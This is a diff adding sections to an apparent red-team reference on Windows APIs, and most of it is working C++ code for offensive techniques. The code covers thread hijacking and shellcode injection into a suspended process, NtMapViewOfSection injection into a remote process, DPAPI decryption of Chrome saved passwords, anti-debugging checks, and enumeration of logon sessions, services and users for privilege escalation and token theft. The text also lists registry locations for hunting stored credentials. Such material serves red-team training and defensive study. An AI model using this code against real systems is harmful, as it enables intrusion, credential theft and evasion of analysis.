@@ -583,10 +583,499 @@ x86_64-w64-mingw32-g++ -o injector.exe injector.cpp -lpsapi -lwtsapi32
 x86_64-w64-mingw32-g++ --shared -o payload.dll payload.cpp
 ```
 
+## Thread Context Manipulation
+
+### GetThreadContext / SetThreadContext — Process Hollowing & Thread Hijacking
+
+Reads and modifies the CPU register state of a suspended thread. Used to redirect execution to injected shellcode by changing the instruction pointer (RIP on x64, EIP on x86).
+
+```cpp
+#include <Windows.h>
+#include <iostream>
+
+int main() {
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+
+    // Create target process in SUSPENDED state
+    CreateProcessW(L"C:\\Windows\\System32\\notepad.exe",
+                   NULL, NULL, NULL, FALSE,
+                   CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+
+    // Allocate and write shellcode into target process
+    BYTE shellcode[] = { 0x90, 0x90, 0xC3 };   // NOP NOP RET (replace with real payload)
+    LPVOID pShellcode = VirtualAllocEx(pi.hProcess, NULL,
+                                       sizeof(shellcode),
+                                       MEM_COMMIT | MEM_RESERVE,
+                                       PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, pShellcode,
+                       shellcode, sizeof(shellcode), NULL);
+
+    // Get current thread context
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.hThread, &ctx);
+
+    std::cout << "Original RIP: 0x" << std::hex << ctx.Rip << "\n";
+
+    // Redirect RIP to our shellcode
+    ctx.Rip = (DWORD64)pShellcode;
+    SetThreadContext(pi.hThread, &ctx);
+
+    // Resume — thread now executes our shellcode first
+    ResumeThread(pi.hThread);
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return 0;
+}
+// Access rights needed: THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME
+// Thread must be suspended before calling GetThreadContext for reliable results
+// x64 uses RIP, x86 uses EIP; 32-bit threads on 64-bit OS need Wow64GetThreadContext
+```
+
+**Red team uses:** Process hollowing (modify primary thread RIP), thread stomping (hijack benign thread), shellcode launcher (create suspended dummy thread, set context, resume). Detected as: suspended thread + RIP modified + RWX allocation.
+
+## DPAPI Credential Decryption
+
+### CryptUnprotectData — Decrypt Browser Passwords, Wi-Fi Keys, RDP Credentials
+
+Decrypts data previously encrypted with `CryptProtectData` (Windows DPAPI). Used by Chrome, Edge, Credential Manager, WLAN profiles, and many applications to protect secrets on disk.
+
+```cpp
+#include <windows.h>
+#include <wincrypt.h>
+#include <iostream>
+#include <vector>
+#pragma comment(lib, "crypt32.lib")
+
+// Decrypt a DPAPI-encrypted blob
+bool DpapiDecrypt(const BYTE* encData, DWORD encSize) {
+    DATA_BLOB inBlob  = { encSize, const_cast<BYTE*>(encData) };
+    DATA_BLOB outBlob = { 0, nullptr };
+
+    if (CryptUnprotectData(
+            &inBlob,     // Encrypted input
+            NULL,        // Optional description (out)
+            NULL,        // Optional entropy (must match CryptProtectData call)
+            NULL,        // Reserved
+            NULL,        // Prompt struct (NULL = silent)
+            0,           // Flags
+            &outBlob))   // Decrypted output
+    {
+        std::cout << "[+] Decrypted (" << outBlob.cbData << " bytes): ";
+        for (DWORD i = 0; i < outBlob.cbData; i++)
+            std::cout << (char)outBlob.pbData[i];
+        std::cout << "\n";
+        LocalFree(outBlob.pbData);
+        return true;
+    }
+    std::cerr << "[-] CryptUnprotectData failed: " << GetLastError() << "\n";
+    return false;
+}
+
+// Chrome password extraction workflow:
+// 1. Open: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data (SQLite)
+// 2. SELECT password_value FROM logins
+// 3. Pass blob to DpapiDecrypt() → cleartext password
+```
+
+**Red team use cases:**
+
+| Target | Details |
+|---|---|
+| Chrome/Edge passwords | `Login Data` SQLite → `password_value` blob → `CryptUnprotectData` |
+| Wi-Fi keys | `%ProgramData%\Microsoft\Wlansvc\Profiles\` → XML → DPAPI blob |
+| RDP credentials | Windows Credential Manager → `CryptUnprotectData` |
+| LSA secrets | Requires SYSTEM + registry hive dump (SECURITY + SYSTEM) |
+
+**OPSEC:** Calling from correct user context is required; DPAPI keys are user/machine-specific. Low detection risk alone — high risk when combined with SQLite browser reads.
+
+## Native Memory Section Mapping
+
+### NtMapViewOfSection / NtUnmapViewOfSection — Process Hollowing, Reflective DLL
+
+Low-level NT APIs to map/unmap section objects (shared memory, file-backed images) into a process's address space. Used to implement process hollowing and reflective DLL injection without calling `VirtualAllocEx`/`WriteProcessMemory` (high-detection triad).
+
+```cpp
+#include <windows.h>
+#include <winternl.h>
+#include <iostream>
+
+// Load NtMapViewOfSection / NtUnmapViewOfSection dynamically
+typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(
+    HANDLE SectionHandle, HANDLE ProcessHandle,
+    PVOID* BaseAddress, ULONG_PTR ZeroBits,
+    SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
+    PSIZE_T ViewSize, DWORD InheritDisposition,
+    ULONG AllocationType, ULONG Win32Protect
+);
+typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(
+    HANDLE ProcessHandle, PVOID BaseAddress
+);
+typedef NTSTATUS(NTAPI* NtCreateSection_t)(
+    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize,
+    ULONG SectionPageProtection, ULONG AllocationAttributes,
+    HANDLE FileHandle
+);
+
+int main() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    auto NtMap   = (NtMapViewOfSection_t)  GetProcAddress(hNtdll, "NtMapViewOfSection");
+    auto NtUnmap = (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
+    auto NtCreate = (NtCreateSection_t)    GetProcAddress(hNtdll, "NtCreateSection");
+
+    // Create a section backed by the page file (anonymous shared memory)
+    HANDLE hSection = nullptr;
+    LARGE_INTEGER maxSize = { .QuadPart = 0x1000 };    // 4 KB
+    NtCreate(&hSection, SECTION_ALL_ACCESS, nullptr,
+             &maxSize, PAGE_EXECUTE_READWRITE,
+             SEC_COMMIT, nullptr);
+
+    // Map into current process (for writing shellcode)
+    PVOID localBase = nullptr;
+    SIZE_T viewSize = 0;
+    NtMap(hSection, GetCurrentProcess(),
+          &localBase, 0, 0, nullptr, &viewSize,
+          1, 0, PAGE_READWRITE);
+
+    // Write payload
+    BYTE payload[] = { 0x90, 0xC3 };   // NOP RET
+    memcpy(localBase, payload, sizeof(payload));
+
+    // Map same section into remote process (shared memory — no WriteProcessMemory!)
+    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, /* target PID */ 1234);
+    PVOID  remoteBase = nullptr;
+    viewSize = 0;
+    NtMap(hSection, hTarget,
+          &remoteBase, 0, 0, nullptr, &viewSize,
+          1, 0, PAGE_EXECUTE_READ);
+
+    std::cout << "[+] Payload mapped at " << remoteBase << " in target process\n";
+
+    CloseHandle(hSection);
+    CloseHandle(hTarget);
+    return 0;
+}
+// Use case: Process hollowing replaces the unmapped .text section of a
+// suspended process with a new section containing the payload.
+// NtUnmapViewOfSection first removes the original image mapping.
+```
+
+**Use cases:** Process hollowing (`NtUnmapViewOfSection` on suspended process → remap payload), reflective DLL loading (map DLL manually instead of via `LoadLibrary`), NTDLL unhooking (map clean copy of ntdll from disk).
+
+## Service Enumeration
+
+### EnumServicesStatusEx — Discover Misconfigured / Privilege-Escalation Services
+
+Enumerates all installed services, returning their names, display names, current state, and process IDs. Critical for discovering `SYSTEM`-level services with weak permissions.
+
+```cpp
+#include <windows.h>
+#include <iostream>
+#pragma comment(lib, "advapi32.lib")
+
+void EnumServices() {
+    // Open Service Control Manager
+    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
+    if (!hSCM) {
+        std::cerr << "[-] OpenSCManager failed: " << GetLastError() << "\n";
+        return;
+    }
+
+    DWORD bytesNeeded = 0, servicesReturned = 0, resumeHandle = 0;
+
+    // First call: get required buffer size
+    EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO,
+                         SERVICE_WIN32, SERVICE_STATE_ALL,
+                         nullptr, 0, &bytesNeeded,
+                         &servicesReturned, &resumeHandle, nullptr);
+
+    std::vector<BYTE> buf(bytesNeeded);
+
+    // Second call: fill buffer
+    if (!EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO,
+                              SERVICE_WIN32, SERVICE_STATE_ALL,
+                              buf.data(), bytesNeeded, &bytesNeeded,
+                              &servicesReturned, &resumeHandle, nullptr)) {
+        std::cerr << "[-] EnumServicesStatusEx failed\n";
+        CloseServiceHandle(hSCM);
+        return;
+    }
+
+    auto* entries = (ENUM_SERVICE_STATUS_PROCESS*)buf.data();
+    for (DWORD i = 0; i < servicesReturned; i++) {
+        auto& e = entries[i];
+        auto state = e.ServiceStatusProcess.dwCurrentState;
+        auto pid   = e.ServiceStatusProcess.dwProcessId;
+        std::wcout << L"[" << (state == SERVICE_RUNNING ? L"RUN" : L"STP") << L"] "
+                   << e.lpServiceName
+                   << L"  PID=" << pid << L"\n";
+    }
+
+    CloseServiceHandle(hSCM);
+}
+// Privesc targets: services running as SYSTEM with weak binary or directory permissions
+// Follow-up: sc qc <service_name> → check BINARY_PATH_NAME for unquoted paths
+```
+
+## Anti-Debugging via NtQueryInformationProcess
+
+### NtQueryInformationProcess — PEB, Debug Port, Parent PID
+
+Queries internal process metadata. Widely used for sandbox detection (checking for debugger attachment via `ProcessDebugPort`) and parent process spoofing (reading `InheritedFromUniqueProcessId`).
+
+```cpp
+#include <Windows.h>
+#include <winternl.h>
+#include <iostream>
+
+// Custom struct — avoids SDK conflicts
+typedef struct _MY_PBI {
+    PVOID    Reserved1;
+    PPEB     PebBaseAddress;
+    PVOID    Reserved2[2];
+    ULONG_PTR UniqueProcessId;
+    ULONG_PTR InheritedFromUniqueProcessId;
+} MY_PBI;
+
+typedef NTSTATUS(NTAPI* NtQIP_t)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
+
+int main() {
+    auto NtQIP = (NtQIP_t)GetProcAddress(
+        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+
+    HANDLE hSelf = GetCurrentProcess();
+
+    // 1. Get PEB address and parent PID
+    MY_PBI pbi = {};
+    NtQIP(hSelf, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
+    std::cout << "PEB:        " << pbi.PebBaseAddress << "\n";
+    std::cout << "PID:        " << pbi.UniqueProcessId << "\n";
+    std::cout << "Parent PID: " << pbi.InheritedFromUniqueProcessId << "\n";
+
+    // 2. Check for debugger via ProcessDebugPort (= 0 if not debugged)
+    DWORD_PTR debugPort = 0;
+    NtQIP(hSelf, (PROCESSINFOCLASS)7 /*ProcessDebugPort*/,
+          &debugPort, sizeof(debugPort), nullptr);
+    std::cout << "DebugPort:  " << debugPort
+              << (debugPort ? "  [DEBUGGER DETECTED]" : "  [clean]") << "\n";
+
+    // 3. Get full image path (ProcessImageFileName = 27)
+    WCHAR imgBuf[512] = {};
+    NtQIP(hSelf, (PROCESSINFOCLASS)27, imgBuf, sizeof(imgBuf), nullptr);
+    auto* ustr = (UNICODE_STRING*)imgBuf;
+    std::wcout << L"Image: " << ustr->Buffer << L"\n";
+
+    return 0;
+}
+// ProcessDebugPort != 0  →  debugger attached  →  exit or fake behavior
+// ProcessBasicInformation.InheritedFromUniqueProcessId  →  detect analysis tools
+//   by comparing parent to expected (e.g., explorer.exe)
+```
+
+## Logon Session Enumeration
+
+### LsaEnumerateLogonSessions / LsaGetLogonSessionData — Session Hunting
+
+Enumerates all active logon sessions on the system. Returns username, domain, logon type (interactive, remote, service), auth package, and logon time. Used to identify privileged sessions for token theft.
+
+```cpp
+#include <windows.h>
+#include <ntsecapi.h>
+#include <iostream>
+#pragma comment(lib, "secur32.lib")
+
+void EnumLogonSessions() {
+    ULONG  count = 0;
+    PLUID  luids = nullptr;
+
+    if (LsaEnumerateLogonSessions(&count, &luids) != 0) {
+        std::cerr << "[-] LsaEnumerateLogonSessions failed\n";
+        return;
+    }
+
+    std::cout << "[+] " << count << " logon sessions:\n";
+
+    for (ULONG i = 0; i < count; i++) {
+        PSECURITY_LOGON_SESSION_DATA data = nullptr;
+        if (LsaGetLogonSessionData(&luids[i], &data) != 0 || !data)
+            continue;
+
+        // Logon types: 2=Interactive, 3=Network, 4=Batch, 5=Service, 10=RemoteInteractive(RDP)
+        static const char* logonTypes[] = {
+            "", "", "Interactive", "Network", "Batch",
+            "Service", "", "", "", "", "RemoteInteractive"
+        };
+        ULONG lt = data->LogonType;
+        const char* ltStr = (lt <= 10) ? logonTypes[lt] : "Unknown";
+
+        std::wcout << L"  LUID: " << luids[i].HighPart << L":" << luids[i].LowPart
+                   << L"  User: " << data->UserName.Buffer
+                   << L"@" << data->Domain.Buffer
+                   << L"  Type: " << ltStr << L"\n";
+
+        LsaFreeReturnBuffer(data);
+    }
+
+    LsaFreeReturnBuffer(luids);
+}
+// Post-exploitation use: find RDP (RemoteInteractive) or domain admin sessions
+// for impersonation via DuplicateToken + ImpersonateLoggedOnUser
+```
+
+## Network Session & User Enumeration
+
+### NetSessionEnum — Active SMB Sessions
+
+```cpp
+#include <windows.h>
+#include <lm.h>
+#include <iostream>
+#pragma comment(lib, "netapi32.lib")
+
+void EnumSMBSessions() {
+    SESSION_INFO_10* buf = nullptr;
+    DWORD read = 0, total = 0, resume = 0;
+    NET_API_STATUS ret;
+
+    do {
+        ret = NetSessionEnum(NULL, NULL, NULL, 10,
+                             (LPBYTE*)&buf, MAX_PREFERRED_LENGTH,
+                             &read, &total, &resume);
+        if (ret == NERR_Success || ret == ERROR_MORE_DATA) {
+            for (DWORD i = 0; i < read; i++) {
+                std::wcout << L"  Client: " << buf[i].sesi10_cname
+                           << L"  User: "  << buf[i].sesi10_username
+                           << L"  Time: "  << buf[i].sesi10_time << L"s\n";
+            }
+            NetApiBufferFree(buf);
+            buf = nullptr;
+        }
+    } while (ret == ERROR_MORE_DATA);
+}
+```
+
+### NetUserEnum — Local / Domain User Accounts
+
+```cpp
+void EnumUsers(LPCWSTR server = NULL) {
+    USER_INFO_1* buf = nullptr;
+    DWORD read = 0, total = 0, resume = 0;
+    NET_API_STATUS ret;
+
+    do {
+        ret = NetUserEnum(server, 1, FILTER_NORMAL_ACCOUNT,
+                          (LPBYTE*)&buf, MAX_PREFERRED_LENGTH,
+                          &read, &total, &resume);
+        if (ret == NERR_Success || ret == ERROR_MORE_DATA) {
+            for (DWORD i = 0; i < read; i++) {
+                bool disabled = (buf[i].usri1_flags & UF_ACCOUNTDISABLE) != 0;
+                std::wcout << L"  " << buf[i].usri1_name
+                           << L"  Priv=" << buf[i].usri1_priv    // 0=Guest 1=User 2=Admin
+                           << L"  " << (disabled ? L"[DISABLED]" : L"[ACTIVE]") << L"\n";
+            }
+            NetApiBufferFree(buf);
+            buf = nullptr;
+        }
+    } while (ret == ERROR_MORE_DATA);
+}
+// usri1_priv == USER_PRIV_ADMIN (2) → local administrator
+// Pass a remote server name (L"\\\\192.168.1.5") to enumerate remote users (requires admin)
+```
+
+## Network Interface Enumeration
+
+### GetAdaptersInfo — IP, MAC, Gateway, DHCP
+
+```cpp
+#include <windows.h>
+#include <iphlpapi.h>
+#include <iostream>
+#pragma comment(lib, "iphlpapi.lib")
+
+void EnumNetworkInterfaces() {
+    ULONG bufLen = 0;
+    GetAdaptersInfo(nullptr, &bufLen);       // get required size
+
+    std::vector<BYTE> buf(bufLen);
+    auto* adap = (IP_ADAPTER_INFO*)buf.data();
+
+    if (GetAdaptersInfo(adap, &bufLen) != ERROR_SUCCESS) {
+        std::cerr << "[-] GetAdaptersInfo failed\n";
+        return;
+    }
+
+    for (IP_ADAPTER_INFO* a = adap; a; a = a->Next) {
+        // Format MAC address
+        char mac[18] = {};
+        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 a->Address[0], a->Address[1], a->Address[2],
+                 a->Address[3], a->Address[4], a->Address[5]);
+
+        std::cout << "Adapter: " << a->Description << "\n"
+                  << "  MAC:     " << mac << "\n"
+                  << "  IP:      " << a->IpAddressList.IpAddress.String << "\n"
+                  << "  Mask:    " << a->IpAddressList.IpMask.String << "\n"
+                  << "  Gateway: " << a->GatewayList.IpAddress.String << "\n"
+                  << "  DHCP:    " << (a->DhcpEnabled ? "Yes" : "No") << "\n\n";
+    }
+}
+// Dual-homed hosts (two adapters in different subnets) are pivot opportunities
+// Internal ranges (10.x, 172.16-31.x, 192.168.x) found here feed the lateral-move target list
+```
+
+## Registry Access
+
+### RegOpenKeyEx / RegQueryValueEx — Persistence & Recon
+
+```cpp
+#include <windows.h>
+#include <iostream>
+
+void ReadRegistryValue(HKEY hive, LPCWSTR subkey, LPCWSTR valueName) {
+    HKEY hKey;
+    if (RegOpenKeyExW(hive, subkey,
+                      0, KEY_READ, &hKey) != ERROR_SUCCESS) {
+        std::wcerr << L"[-] RegOpenKeyEx failed: " << GetLastError() << L"\n";
+        return;
+    }
+
+    DWORD type = 0, size = 0;
+    RegQueryValueExW(hKey, valueName, nullptr, &type, nullptr, &size);
+
+    std::vector<BYTE> buf(size);
+    if (RegQueryValueExW(hKey, valueName, nullptr, &type,
+                         buf.data(), &size) == ERROR_SUCCESS) {
+        if (type == REG_SZ || type == REG_EXPAND_SZ) {
+            std::wcout << L"  Value: " << (LPCWSTR)buf.data() << L"\n";
+        } else {
+            std::cout << "  Binary/DWORD value (" << size << " bytes)\n";
+        }
+    }
+    RegCloseKey(hKey);
+}
+
+// Persistence — check AutoRun locations:
+// HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+// HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+// Security posture — check Defender/UAC status:
+// HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection
+//   DisableRealtimeMonitoring = 1 → Defender disabled
+
+// Credential hunting — Putty saved sessions:
+// HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\*
+//   HostName, UserName, PublicKeyFile
+```
+
 ## Resources
 
+- Windows API for Red Team - Introduction (course material)
 - Windows-API-for-Red-Team — `github.com/WesleyWong420/Windows-API-for-Red-Team`
 - Microsoft Win32 API docs — `learn.microsoft.com/en-us/windows/win32/api/`
+- MalAPI.io — Windows API categorized by offensive use — `malapi.io`
 - Malware Development — `github.com/cocomelonc/meow`
 - Process Injection Techniques — `github.com/RedTeamOperations/Advanced-Process-Injection-Workshop`
 - Sektor7 Malware Development Essentials — `institute.sektor7.net`
